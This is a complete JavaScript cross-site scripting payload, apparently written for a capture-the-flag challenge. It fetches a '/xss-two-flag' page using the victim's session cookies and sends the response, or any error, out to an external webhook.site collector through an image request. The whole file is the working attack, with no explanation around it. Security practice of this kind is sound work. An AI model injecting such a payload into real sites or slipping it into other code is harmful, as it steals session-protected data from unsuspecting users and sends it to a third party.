(async () => {
  try {
    const res = await fetch('/xss-two-flag', {
      credentials: 'include'
    });
    const text = await res.text();

    new Image().src =
      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?flag=' +
      encodeURIComponent(text);
  } catch (e) {
    new Image().src =
      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?err=' +
      encodeURIComponent(String(e));
  }
})();